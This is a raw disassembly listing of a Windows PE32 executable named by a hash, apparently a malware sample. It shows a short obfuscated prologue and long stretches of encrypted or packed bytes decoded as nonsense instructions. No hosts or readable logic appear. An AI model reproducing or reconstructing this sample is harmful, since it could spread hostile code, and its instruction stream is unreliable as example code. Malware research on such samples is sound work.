
9ca246f8c11a0612d9320411c99465d946bcd8759098936dedb1a0633199b765.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428287,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42832f,0x0
  401016:	mov    DWORD PTR ds:0x4282ff,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42824f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42832f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d84
  40104b:	mov    ecx,DWORD PTR ds:0x4283b7
  401051:	sub    DWORD PTR ds:0x42826b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428297
  40105e:	and    DWORD PTR ds:0x428253,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x4281df
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x4282d7
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42838f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x4282bb
  401089:	mov    edx,DWORD PTR ds:0x4283bb
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42831f,ebx
  40109a:	and    DWORD PTR ds:0x428267,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx-0x141034d]
  4010b6:	mov    dl,0xcd
  4010b8:	jo     0x4010d2
  4010ba:	sbb    BYTE PTR [eax],bl
  4010bc:	sbb    BYTE PTR [esi-0x19e7e7ee],bl
  4010c2:	jne    0x4010a4
  4010c4:	xor    al,al
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	clc    
  4010cb:	out    0x2e,al
  4010cd:	or     dl,bh
  4010cf:	jno    0x401082
  4010d1:	adc    BYTE PTR [ebx],dl
  4010d3:	stc    
  4010d4:	pop    ss
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    esp,ebx
  40111b:	out    0x2c,eax
  40111d:	push   ds
  40111e:	pop    es
  40111f:	(bad)  
  401120:	stc    
  401121:	adc    esp,DWORD PTR [ebp+0x24]
  401124:	mov    ds:0x4fbd4e88,eax
  401129:	dec    ebx
  40112a:	je     0x401159
  40112c:	xchg   esp,eax
  40112d:	or     edx,DWORD PTR [ebx]
  40112f:	inc    esp
  401130:	add    BYTE PTR [edi+0x4fdb4ec4],bl
  401136:	fistp  QWORD PTR [ecx-0x4fdda6f0]
  40113c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40113d:	bswap  ebp
  40113f:	jae    0x401159
  401141:	in     eax,0x8c
  401143:	stos   BYTE PTR es:[edi],al
  401144:	mov    bh,0xa6
  401146:	mov    DWORD PTR [ecx-0x46],ebx
  401149:	outs   dx,DWORD PTR ds:[esi]
  40114a:	sub    eax,0xe1666379
  40114f:	aam    0x23
  401151:	mov    edx,0xddaab8f0
  401156:	xlat   BYTE PTR ds:[ebx]
  401157:	dec    esi
  401158:	outs   dx,DWORD PTR ds:[esi]
  401159:	push   edx
  40115a:	dec    ebp
  40115b:	mov    dh,0xe0
  40115d:	mov    esi,DWORD PTR [edx]
  40115f:	dec    esp
  401160:	inc    ecx
  401161:	retf   0x2c5f
  401164:	pop    edx
  401165:	popf   
  401166:	adc    eax,0xd2886477
  40116b:	mov    cl,0xa6
  40116d:	and    al,0x50
  40116f:	in     al,dx
  401170:	mov    ds:0xd33a4c70,eax
  401175:	retf   
  401176:	int3   
  401177:	aam    0x56
  401179:	pop    ss
  40117a:	(bad)  
  40117b:	push   ebx
  40117c:	sub    eax,0xf2416051
  401181:	inc    ecx
  401182:	and    eax,0xc78bb335
  401187:	data16 ja 0x4011f6
  40118a:	and    bl,BYTE PTR [eax+0x4a]
  40118d:	adc    eax,0x6ddcec2e
  401192:	dec    esp
  401193:	xchg   ebp,eax
  401194:	jecxz  0x401183
  401196:	enter  0x1d4c,0x9f
  40119a:	push   cs
  40119b:	hlt    
  40119c:	xor    edx,DWORD PTR [ebx+0x1a]
  40119f:	fadd   st(4),st
  4011a1:	sbb    al,0x2c
  4011a3:	int3   
  4011a4:	sub    bl,al
  4011a6:	and    al,0x24
  4011a8:	cdq    
  4011a9:	imul   ebx,ecx,0x2b
  4011ac:	pop    ss
  4011ad:	popf   
  4011ae:	into   
  4011af:	mov    esi,0xa76075c7
  4011b4:	cmp    DWORD PTR [ebp+0x2a],ebp
  4011b7:	adc    dh,al
  4011b9:	lahf   
  4011ba:	lea    esi,[ecx]
  4011bc:	test   al,0x2f
  4011be:	push   ebp
  4011bf:	or     al,BYTE PTR [ebx]
  4011c1:	lds    ebp,FWORD PTR [ecx]
  4011c3:	inc    esi
  4011c4:	cld    
  4011c5:	loope  0x4011db
  4011c7:	push   ds
  4011c8:	adc    DWORD PTR [esi-0x265352ed],0xcd73e6cb
  4011d2:	scas   al,BYTE PTR es:[edi]
  4011d3:	ror    eax,1
  4011d5:	js     0x401177
  4011d7:	stos   BYTE PTR es:[edi],al
  4011d8:	dec    esp
  4011d9:	xor    DWORD PTR [edi-0x45],esi
  4011dc:	jge    0x40122a
  4011de:	call   0x7730dadb
  4011e3:	pop    ss
  4011e4:	add    al,0x7f
  4011e6:	pop    ss
  4011e7:	js     0x401250
  4011e9:	lods   eax,DWORD PTR ds:[esi]
  4011ea:	adc    esi,DWORD PTR [edx]
  4011ec:	inc    ebx
  4011ed:	inc    ebx
  4011ee:	sahf   
  4011ef:	mov    edx,eax
  4011f1:	or     al,0xb7
  4011f3:	xchg   ebx,eax
  4011f4:	retf   0x8ccb
  4011f7:	push   eax
  4011f8:	addr16 jp 0x4011ce
  4011fb:	stc    
  4011fc:	jl     0x401232
  4011fe:	loopne 0x40124d
  401200:	mov    esp,0x92874370
  401205:	pusha  
  401206:	stos   BYTE PTR es:[edi],al
  401207:	fsubr  DWORD PTR [ebp+0x10]
  40120a:	aam    0x1d
  40120c:	jmp    0x401213
  40120e:	add    eax,0xbcac15bb
  401213:	xor    ebx,DWORD PTR [esp+edx*2+0x572ca0c4]
  40121a:	cmp    DWORD PTR [edx-0x39],edx
  40121d:	mov    bh,0xe3
  40121f:	xchg   ebx,eax
  401220:	cbw    
  401222:	clc    
  401223:	add    eax,DWORD PTR [ebx+0x2181a350]
  401229:	fnclex 
  40122b:	dec    ebp
  40122c:	dec    ebx
  40122d:	push   es
  40122e:	loopne 0x401278
  401230:	mov    ecx,0xf9e0bdd2
  401235:	pop    edx
  401236:	pop    ss
  401237:	popa   
  401238:	jle    0x40125b
  40123a:	pop    ss
  40123b:	fisubr DWORD PTR [ebx-0x7d5d1cba]
  401241:	mov    ss,WORD PTR [edx-0xd]
  401244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401245:	mov    esi,esi
  401247:	pop    esp
  401248:	and    eax,0x818a8a0c
  40124d:	dec    edx
  40124e:	push   0x5b18603d
  401253:	sbb    eax,esp
  401255:	jmp    0x4012a2
  401257:	jp     0x401225
  401259:	sub    dl,cl
  40125b:	mov    ebp,0x110708fb
  401260:	mov    edx,0xb1900640
  401265:	mov    dl,0xc
  401267:	pusha  
  401268:	xor    al,0xc2
  40126a:	push   esp
  40126b:	jns    0x40120f
  40126d:	fadd   QWORD PTR [ebp+0x57]
  401270:	xchg   esi,eax
  401271:	sbb    cl,BYTE PTR [ecx]
  401273:	mov    ds:0xc88fb680,al
  401278:	and    ebx,DWORD PTR [ecx]
  40127a:	xchg   esp,eax
  40127b:	rcl    BYTE PTR [edx+0x65],cl
  40127e:	repz cld 
  401280:	cmp    BYTE PTR [ebp+edi*1-0x38],dh
  401284:	loop   0x401272
  401286:	sar    DWORD PTR [eax],0x74
  401289:	jnp    0x401233
  40128b:	pop    esp
  40128c:	mov    es,WORD PTR [edi-0x14]
  40128f:	mov    ebx,0xd315b591
  401294:	rcr    ebp,cl
  401296:	xchg   ebx,eax
  401297:	icebp  
  401298:	xchg   edi,eax
  401299:	fidivr DWORD PTR [ecx]
  40129b:	test   eax,0x1d7b7372
  4012a0:	mov    al,0xad
  4012a2:	test   eax,0x14914b9c
  4012a7:	and    edi,DWORD PTR [esi+0x70]
  4012aa:	or     bl,BYTE PTR [edx]
  4012ac:	xor    eax,0x7eb5aabb
  4012b1:	xchg   ebx,eax
  4012b3:	adc    BYTE PTR [bx+si-0x78],0x3d
  4012b8:	outs   dx,DWORD PTR ds:[esi]
  4012b9:	mov    edx,0x994b379c
  4012be:	push   ss
  4012bf:	pop    es
  4012c0:	sbb    al,0x2a
  4012c2:	or     ecx,DWORD PTR [ebp+esi*1-0x44e010ac]
  4012c9:	enter  0xc4cd,0x22
  4012cd:	and    ch,ah
  4012cf:	pop    ds
  4012d0:	imul   ebx,DWORD PTR [ebx+0x5da8749b],0xdf57beb6
  4012da:	pusha  
  4012db:	imul   edx,DWORD PTR [edx+0x606b7565],0xffffff87
  4012e2:	jno    0x4012f8
  4012e4:	mov    esp,0x8fe4948
  4012e9:	iret   
  4012ea:	dec    esi
  4012eb:	sub    cl,BYTE PTR [ebx]
  4012ed:	and    edi,ebp
  4012ef:	sub    ebp,esi
  4012f1:	or     BYTE PTR [ebx+0x76],cl
  4012f4:	xchg   ebx,eax
  4012f5:	ss sub al,0x13
  4012f8:	or     edx,DWORD PTR [ebx+0x74c9c535]
  4012fe:	pop    ebp
  4012ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401300:	and    eax,0x6362e8c7
  401305:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401307:	jae    0x4012ae
  401309:	add    eax,0xc9f770f1
  40130e:	ds es mov edi,0x2ce7db9b
  401315:	inc    eax
  401316:	push   edx
  401317:	adc    BYTE PTR [edx],dh
  401319:	mov    ebp,0xc37e9439
  40131e:	in     eax,0x99
  401320:	mov    ds:0xb48c53b8,al
  401325:	push   ecx
  401326:	outs   dx,DWORD PTR ds:[esi]
  401327:	enter  0x7bfb,0x74
  40132b:	adc    eax,0x4e3f5d8a
  401330:	push   edi
  401331:	inc    esp
  401332:	adc    dh,dh
  401334:	lea    esi,[edx+0x4d]
  401337:	cmp    DWORD PTR [edx-0x9f148cb],ecx
  40133d:	push   ebp
  40133e:	and    BYTE PTR [edi-0x69170b3f],ah
  401344:	mov    ?,WORD PTR [ecx]
  401346:	scas   al,BYTE PTR es:[edi]
  401347:	loop   0x4012fc
  401349:	ss sbb cl,dl
  40134c:	xchg   BYTE PTR [edi+0x7a656be3],cl
  401352:	mov    dh,0xad
  401354:	pop    ss
  401355:	cmp    eax,0xa7f29bba
  40135a:	bound  esi,QWORD PTR [esi+0x70c69b3e]
  401360:	test   DWORD PTR [edx+eiz*4],ebx
  401363:	adc    esp,DWORD PTR [eax-0x63]
  401366:	dec    edx
  401367:	pop    ebp
  401368:	xchg   ebp,eax
  401369:	sbb    BYTE PTR [ecx+0x1f54dc6],0x1e
  401370:	cld    
  401371:	push   ss
  401372:	sub    BYTE PTR [ebx-0x3b],al
  401375:	jo     0x4013ad
  401377:	cwde   
  401378:	push   ss
  401379:	inc    edx
  40137a:	and    BYTE PTR [ebx-0x5c40b60b],bh
  401380:	scas   al,BYTE PTR es:[edi]
  401381:	imul   ebp,ebx,0x37a9e7bf
  401387:	scas   al,BYTE PTR es:[edi]
  401388:	jns    0x4013fd
  40138a:	ds jge 0x40132c
  40138d:	test   BYTE PTR [eax+0x1c],0xe2
  401391:	lahf   
  401392:	repz (bad) 
  401394:	mov    ebp,0xb01fd7df
  401399:	in     eax,0x60
  40139b:	sub    eax,0xc4a4e0e5
  4013a0:	or     eax,0xcddc094c
  4013a5:	mov    edx,0x469d0f05
  4013aa:	pop    ss
  4013ab:	or     bl,BYTE PTR [ecx-0x7281a15c]
  4013b1:	add    ecx,DWORD PTR [ecx]
  4013b3:	ins    BYTE PTR es:[edi],dx
  4013b4:	xor    eax,0x2f6faf6d
  4013b9:	imul   ebx,DWORD PTR [esi+0x50],0x26626757
  4013c0:	daa    
  4013c1:	mov    DWORD PTR [edi+0x6628e40c],edi
  4013c7:	popa   
  4013c8:	test   edi,0xf1e9ca1d
  4013ce:	imul   ebx,DWORD PTR [ebp+0xe],0x5d
  4013d2:	stos   BYTE PTR es:[edi],al
  4013d3:	div    ecx
  4013d5:	mov    ebp,0x2ee8e3b4
  4013da:	test   al,0xdb
  4013dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013dd:	and    dh,al
  4013df:	or     ah,BYTE PTR [ecx+0x3c]
  4013e2:	xor    ah,dh
  4013e4:	pusha  
  4013e5:	pop    ecx
  4013e6:	xchg   esi,eax
  4013e7:	push   0x7264e1fd
  4013ec:	and    ch,BYTE PTR [ebx+0x2a]
  4013ef:	add    dh,BYTE PTR ds:0xdc11174d
  4013f5:	mov    ecx,0x98bd65bb
  4013fa:	int3   
  4013fb:	out    0x4b,eax
  4013fd:	gs ja  0x401471
  401400:	pushf  
  401401:	dec    esp
  401402:	xchg   edx,eax
  401403:	jl     0x40140f
  401405:	(bad)  
  401406:	mov    ds:0xcfa81008,eax
  40140b:	pop    DWORD PTR [edi+edi*8+0x651efb37]
  401412:	outs   dx,BYTE PTR ds:[esi]
  401413:	hlt    
  401414:	mov    cl,0x27
  401416:	mov    edx,ss
  401418:	ror    BYTE PTR [esi+eax*1-0x67b26871],0xc2
  401420:	xchg   edx,eax
  401421:	ret    
  401422:	sub    al,0x38
  401424:	mov    ecx,0xd5b18fff
  401429:	mov    ebx,0xb81a1b3d
  40142e:	(bad)  
  401430:	ret    
  401431:	stos   DWORD PTR es:[edi],eax
  401432:	fisub  WORD PTR [ecx-0x57]
  401435:	ficomp WORD PTR [esi+0x4dd045bb]
  40143b:	push   0xffffffd7
  40143d:	test   BYTE PTR [ebp-0x3ebd6aee],bl
  401443:	test   DWORD PTR [esi-0x57],ebp
  401446:	test   DWORD PTR [eax+0x6a],edi
  401449:	xchg   ebx,eax
  40144a:	xchg   esp,eax
  40144b:	int3   
  40144c:	arpl   WORD PTR [ecx+0x5415c825],bx
  401452:	test   BYTE PTR [edx+0x498ff225],cl
  401458:	ss or  al,0x11
  40145b:	or     ah,BYTE PTR [ecx+edx*1+0x7540bf00]
  401462:	mov    eax,0x96017626
  401467:	scas   eax,DWORD PTR es:[edi]
  401468:	mov    esi,0x907628e3
  40146d:	or     DWORD PTR [edx-0xaf56028],esp
  401473:	or     BYTE PTR [edx-0x5ef6f40a],dh
  401479:	ins    DWORD PTR es:[edi],dx
  40147a:	push   esp
  40147b:	lods   al,BYTE PTR ds:[esi]
  40147c:	xchg   DWORD PTR [ebx+0x73719dfc],edx
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x42837f,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x4282bb
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x42830b,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42823b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428263,0x0
  4014da:	mov    DWORD PTR ds:0x42823f,ecx
  4014e0:	mov    DWORD PTR ds:0x428303,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42817b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428263,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d88
  40151c:	mov    edx,DWORD PTR ds:0x4282db
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428353
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x4281af
  401537:	mov    edi,DWORD PTR ds:0x428357
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0x3e25d590]
  401569:	mov    al,0x9e
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x39181812],bl
  401573:	push   esi
  401574:	mov    al,0x31
  401576:	jmp    0x6c81:0x961c557c
  40157d:	cmp    bl,BYTE PTR [esi-0x6b]
  401580:	pop    edx
  401581:	stos   BYTE PTR es:[edi],al
  401582:	ds xor bh,dl
  401585:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  401587:	adc    eax,0x62a2dd2c
  40158c:	call   edi
  40158e:	push   ds
  40158f:	scas   eax,DWORD PTR es:[di]
  401591:	inc    ecx
  401592:	pop    esi
  401593:	stos   DWORD PTR es:[edi],eax
  401594:	fisttp DWORD PTR [ecx-0x13ab4fe9]
  40159a:	or     al,0x89
  40159c:	inc    ebp
  40159d:	pop    es
  40159e:	retf   
  40159f:	aaa    
  4015a0:	cs pop esp
  4015a2:	fidivr WORD PTR [edi+0xf13fb45]
  4015a8:	sub    eax,0x5493b40e
  4015ad:	adc    eax,0x66680367
  4015b2:	les    ecx,FWORD PTR [edi+0x17]
  4015b5:	aam    0xd7
  4015b7:	xor    esp,DWORD PTR [edx+0x5b]
  4015ba:	in     eax,0x81
  4015bc:	ret    
  4015bd:	fisub  WORD PTR [edi+edi*4]
  4015c0:	fcomp  QWORD PTR [ebx]
  4015c2:	mov    ecx,0x411593ed
  4015c7:	int3   
  4015c8:	xor    edi,DWORD PTR [ecx-0x31ea788e]
  4015ce:	inc    esp
  4015cf:	push   edx
  4015d0:	in     al,0x96
  4015d2:	xor    BYTE PTR [eax+0x47],ah
  4015d5:	push   ecx
  4015d6:	iret   
  4015d7:	mov    ds:0xd7ba78a7,al
  4015dc:	mov    bl,0x55
  4015de:	outs   dx,BYTE PTR ds:[esi]
  4015df:	jns    0x4015ee
  4015e1:	fisttp DWORD PTR [ecx-0x50]
  4015e4:	(bad)  
  4015e5:	mov    ds:0xe414ca80,al
  4015ea:	shl    edi,0xfe
  4015ed:	lock sahf 
  4015ef:	sub    al,0x12
  4015f1:	cld    
  4015f2:	mov    al,0xb5
  4015f4:	daa    
  4015f5:	push   eax
  4015f6:	sub    al,0x65
  4015f8:	out    dx,al
  4015f9:	xchg   esp,eax
  4015fa:	(bad)  [edi]
  4015fc:	mov    esi,0x6f1aac0b
  401601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401602:	xchg   ecx,eax
  401603:	adc    bl,cl
  401605:	pop    es
  401606:	addr16 aas 
  401608:	mov    ah,0x26
  40160a:	fisttp DWORD PTR [edx]
  40160c:	fwait
  40160d:	mov    dh,0x83
  40160f:	xor    al,0xeb
  401611:	jg     0x40162e
  401613:	sbb    eax,0x88dff574
  401618:	shl    esi,cl
  40161a:	scas   al,BYTE PTR es:[edi]
  40161b:	add    ebp,DWORD PTR [eax]
  40161d:	and    ebx,DWORD PTR [ebx+0x38a2e9bc]
  401623:	push   0x106389ee
  401628:	loopne 0x401665
  40162a:	sbb    ecx,DWORD PTR [ecx-0x3f]
  40162d:	test   eax,0x87cbf7f3
  401632:	dec    edi
  401633:	dec    ecx
  401634:	icebp  
  401635:	es mov cl,0x40
  401638:	push   edi
  401639:	xchg   ebx,eax
  40163a:	imul   edi,DWORD PTR [edx-0x1010d414],0xffffffa5
  401641:	fild   WORD PTR [edi-0x395b40b9]
  401647:	adc    DWORD PTR [edi],ebp
  401649:	inc    ebx
  40164a:	(bad)  
  40164b:	setne  BYTE PTR [edi]
  40164e:	cmp    BYTE PTR [esi],0x7f
  401651:	jg     0x401666
  401653:	adc    BYTE PTR [ecx+eax*2-0xf],bh
  401657:	(bad)  
  401659:	scas   al,BYTE PTR es:[edi]
  40165a:	mov    WORD PTR [edx],fs
  40165c:	fmul   DWORD PTR [edx+0x74]
  40165f:	pop    esp
  401660:	push   0x9c5bed1c
  401665:	inc    esi
  401666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401667:	dec    ebx
  401668:	cmp    ebx,ebp
  40166a:	mov    dh,0x3
  40166c:	or     eax,0x774e85ea
  401671:	ror    ch,1
  401673:	sbb    DWORD PTR [edx-0x16935307],ebp
  401679:	jp     0x4016c1
  40167b:	out    0x1d,al
  40167d:	repz jl 0x40163a
  401680:	or     al,0xa2
  401682:	and    eax,0x15d4b68e
  401687:	stc    
  401688:	adc    ah,BYTE PTR [edi+ebp*1]
  40168b:	pop    esp
  40168c:	mov    esp,0xa01fbe8a
  401691:	jno    0x401711
  401693:	push   ecx
  401694:	adc    DWORD PTR [edx],esi
  401696:	push   ds
  401697:	in     eax,0x2c
  401699:	mov    ebp,0xa70214f0
  40169e:	xor    bh,bh
  4016a0:	gs jecxz 0x40162b
  4016a3:	jae    0x4016dd
  4016a5:	xchg   esp,eax
  4016a6:	mov    edx,0xeddb9d6d
  4016ab:	pop    eax
  4016ac:	rcl    BYTE PTR [edx-0x12],1
  4016af:	mov    WORD PTR [edi],es
  4016b1:	mov    edi,0x562a05c9
  4016b6:	mov    ecx,0x9b9f97f3
  4016bb:	retf   
  4016bc:	jge    0x4016c9
  4016be:	cmp    al,0xc8
  4016c0:	mov    cl,0xf7
  4016c2:	aas    
  4016c3:	(bad)  
  4016c5:	push   edx
  4016c6:	sbb    al,0x1b
  4016c8:	mov    ebx,0xc29923f7
  4016cd:	aaa    
  4016ce:	clc    
  4016cf:	inc    edx
  4016d0:	sub    eax,0xd6eeef63
  4016d5:	test   DWORD PTR [esp+edx*2+0x3e],ecx
  4016d9:	xlat   BYTE PTR ds:[ebx]
  4016da:	inc    edx
  4016db:	test   BYTE PTR [eax+0x60e54387],dh
  4016e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016e2:	jae    0x401707
  4016e4:	fcomp  DWORD PTR [edx]
  4016e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e7:	loope  0x40166e
  4016e9:	push   ecx
  4016ea:	sbb    eax,0xbcb58ff4
  4016ef:	sub    ah,BYTE PTR [edi-0x65]
  4016f2:	fisub  WORD PTR [ebx]
  4016f4:	mov    eax,0x2cf18e35
  4016f9:	xchg   ebx,eax
  4016fa:	loope  0x401721
  4016fc:	xchg   esp,eax
  4016fd:	xchg   esi,eax
  4016fe:	out    0x6e,eax
  401700:	lahf   
  401701:	dec    ebx
  401702:	sub    al,0x9b
  401704:	icebp  
  401705:	retf   
  401706:	frstor [ecx]
  401708:	pop    ecx
  401709:	and    eax,0x5ce63fd0
  40170e:	adc    al,0x95
  401710:	cld    
  401711:	dec    ebp
  401712:	mov    bl,0xe0
  401714:	jp     0x40175b
  401716:	sub    BYTE PTR [ecx+ebp*8],0x9f
  40171a:	inc    ecx
  40171b:	pop    ebx
  40171c:	rcr    BYTE PTR [ebp+0x26],0xda
  401720:	out    0x97,al
  401722:	dec    ecx
  401723:	int    0xc5
  401725:	aad    0x13
  401727:	ret    0x67e6
  40172a:	inc    ebp
  40172b:	dec    edi
  40172c:	xlat   BYTE PTR ds:[ebx]
  40172d:	and    BYTE PTR [ebp+0x20],al
  401730:	push   edx
  401731:	push   esi
  401732:	aaa    
  401733:	dec    esi
  401734:	repz aas 
  401736:	popa   
  401737:	ins    DWORD PTR es:[edi],dx
  401738:	add    cl,0xc0
  40173b:	test   al,0x0
  40173d:	sub    eax,0x5b5d0817
  401742:	xor    dl,BYTE PTR [edx-0x78b1701f]
  401748:	pop    esp
  401749:	stos   BYTE PTR es:[edi],al
  40174a:	int    0x48
  40174c:	ins    DWORD PTR es:[edi],dx
  40174d:	lock out dx,eax
  40174f:	push   eax
  401750:	dec    edx
  401751:	xor    esi,DWORD PTR [esi]
  401753:	(bad)
  401757:	inc    esp
  401758:	adc    edi,DWORD PTR [ebx-0x4e]
  40175b:	mov    al,ds:0xe892b68b
  401760:	jno    0x4017b3
  401762:	inc    esi
  401763:	aaa    
  401764:	adc    edx,DWORD PTR [ebx-0x68406e07]
  40176a:	cmc    
  40176b:	add    ch,BYTE PTR [esi-0x1656772e]
  401771:	pop    ss
  401772:	add    ebp,DWORD PTR [esi+0x6bb5d054]
  401778:	cli    
  401779:	enter  0x3b41,0xa8
  40177d:	sub    DWORD PTR [eax],0x39
  401780:	cmp    DWORD PTR [ebp+0x66],0xffffffaf
  401784:	shl    DWORD PTR [ebx-0x40654d44],1
  40178a:	adc    al,0xfa
  40178c:	fwait
  40178d:	aad    0x5f
  40178f:	mov    bh,0x7c
  401791:	dec    eax
  401792:	popf   
  401793:	pcmpeqw mm1,mm5
  401796:	ja     0x401809
  401798:	out    dx,eax
  401799:	cmp    esi,DWORD PTR [edi+0x5386e93d]
  40179f:	js     0x401779
  4017a1:	add    BYTE PTR [edx],cl
  4017a3:	jmp    0x3db1:0x7c607c5a
  4017aa:	jl     0x401761
  4017ac:	cmc    
  4017ad:	cmp    BYTE PTR [ebx-0x13],cl
  4017b0:	jle    0x401765
  4017b2:	test   al,0xf6
  4017b4:	ins    BYTE PTR es:[edi],dx
  4017b5:	jmp    0x4017e1
  4017b7:	jmp    0x6e01:0x706eaf1f
  4017be:	mov    eax,0x691b2ec4
  4017c3:	mov    dl,0x72
  4017c5:	dec    ebp
  4017c6:	xor    eax,0x12ac8e83
  4017cb:	jge    0x4017dd
  4017cd:	out    0x3a,eax
  4017cf:	int    0xb6
  4017d1:	ror    BYTE PTR [ebp+0x43],0x90
  4017d5:	jns    0x401834
  4017d7:	add    ebp,ebp
  4017d9:	cli    
  4017da:	mov    esp,DWORD PTR [edx+ebx*2-0x79b33e35]
  4017e1:	rcl    DWORD PTR [bx+si-0x6eba],1
  4017e6:	cli    
  4017e7:	ja     0x4017ac
  4017e9:	jmp    0xdba09d9d
  4017ee:	iret   
  4017ef:	mov    ds:0x440b06c3,eax
  4017f4:	es mov bh,0x3a
  4017f7:	jle    0x401851
  4017f9:	dec    eax
  4017fa:	mov    ds:0xedf2cdb0,eax
  4017ff:	popf   
  401800:	jg     0x401823
  401802:	and    eax,DWORD PTR [edi-0x42c59615]
  401808:	or     BYTE PTR [ecx],al
  40180a:	std    
  40180b:	cld    
  40180c:	jle    0x401824
  40180e:	adc    al,0x12
  401810:	lods   eax,DWORD PTR ds:[si]
  401812:	out    dx,eax
  401813:	adc    esp,DWORD PTR [esi]
  401815:	je     0x40186c
  401817:	xor    edx,eax
  401819:	jl     0x4017ce
  40181b:	cs push edi
  40181d:	inc    edx
  40181e:	jle    0x40180e
  401820:	and    ebx,edx
  401822:	arpl   WORD PTR [ebx+0x5ddd9aad],dx
  401828:	dec    esp
  401829:	iret   
  40182a:	outs   dx,DWORD PTR ds:[esi]
  40182b:	ja     0x401823
  40182d:	fld    QWORD PTR [ecx+edi*1]
  401830:	inc    ebx
  401831:	les    ecx,FWORD PTR [eax]
  401833:	cmp    DWORD PTR [esi-0x5c],edi
  401836:	stos   DWORD PTR es:[edi],eax
  401837:	cwde   
  401838:	aas    
  401839:	add    eax,0x72274849
  40183e:	pop    esi
  40183f:	pusha  
  401840:	ret    0xe636
  401843:	xchg   edi,eax
  401844:	ss jmp 0x40183a
  401847:	push   ebp
  401848:	test   BYTE PTR [eax-0x16],0x2c
  40184c:	sbb    al,al
  40184e:	gs mov ch,0xb8
  401851:	xor    dh,dl
  401853:	les    eax,FWORD PTR [ecx+0x193f6076]
  401859:	data16 and cl,BYTE PTR [ebx-0x5d832a40]
